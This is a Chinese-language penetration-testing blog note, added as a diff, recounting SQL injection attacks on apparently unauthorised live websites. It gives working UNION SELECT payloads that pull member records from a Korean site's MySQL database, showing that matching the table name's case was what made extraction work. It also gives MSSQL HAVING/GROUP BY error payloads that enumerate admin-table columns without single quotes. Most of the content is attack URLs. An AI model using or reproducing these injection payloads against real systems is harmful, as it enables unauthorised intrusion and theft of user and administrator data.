@@ -1,0 +1,56 @@
+
+100316渗透笔记
+
+把最近碰到的问题简单的纪录下吧，感觉有些时候技巧是必须的！
+
+NO1 PHP注入竟然分大小写
+
+某次鱼总丢一站点来，说能表名和列名，就是取不出值！
+
+手工试了下，这个站很怪，有一点错误就会弹一个框框出来，由于是KR站，所以看不懂内容，最后通过抓取pangolin的包，
+
+得到字段数为16，pangolin的语句为：
+
+BMode=Show&table=gongji&uid_no=318+and+1=2+union+select+0,0,0,concat(char(94),char(94),char(94),cast(count(*)+as+char),char(94),char(94),char(94)),0,0,0,0,0,0,0,0,0,0,0,0+from+information_schema.tables+where+table_schema=0x656e3475+limit+1--+and+1=1
+
+这下好办，试着将第四个字段换成@@version，OK，显示正常，没弹框（这个过程中，我把javascript禁用了，方便点）
+
+于是换成：
+http://www.xx/community/01.php?BMode=Show&table=gongji&uid_no=318+and+1=2+union+select+0,0,0,m_id,0,0,0,0,0,0,0,0,0,0,0,0+from+mem_info+limit+1,1--
+
+果然什么都没有，怪不得pangolin也取不到值呢！都到这地步了，简单分析可知，这里应该并没有什么过滤系统，
+
+最后怀疑是不是在大小写上有手脚，于是将表名大小写换成目标一样后（这里只是表名切换成大小写，列名不受大小写影响），
+
+成功得到内容：
+[url=http://www.xx/community/01.php?BMode=Show&table=gongji&uid_no=318+and+1=2+union+select+0,0,0,m_id,0,0,0,0,0,0,0,0,0,0,0,0+from+Mem_Info+limit+1,1--
+
+以前记得php+mysql组合是不分大小写的，今天竟然碰到这样的问题，很是奇怪！另外提一下mysql里的limit语句，
+
+如果管理员只有一个用户的话，语句应该为select name,password from admin limit 0,1，
+
+而非之前的select name,password from admin limit 1,1，limit x,y，表示从x行开始取y 条纪录。这个站就是这样的，
+
+当时可把鱼总搞郁闷了，因为老暴不出值来，呵呵……
+
+后来从波哥那里得知，这种情况可能是一些IDS的影响
+
+NO2 MSSQL注入单引号绕过
+
+也是以前帮鱼总搞站的时候，记得在暴列名的时候，
+
+无法用select column_name from information_schema.columns where table_name=’xxx’来取，因为这里的单引号过滤掉了，
+
+上次的解决办法是先猜出admin表下有个name列，然后利用select * from admin group by  name这样的方法得到列，
+
+今天发现其实就算不知道里面任何一列，也是可以做到的，语句如下：
+
+http://xx.com/Pages/Main/News.aspx?nid=119+and+1=%28selEct%20from%20tAdminLogin%20having%201=1%29
+
+这样得到当前一个列名为IdfAdmin，得到下一个列名：
+
+http://xx.com/Pages/Main/News.aspx?nid=119+and+1=%28selEct%20%20from%20tAdminLogin%20group%20by%20IDfAdmin%29
+
+这样，单引号限制完全就绕过了！
+
+
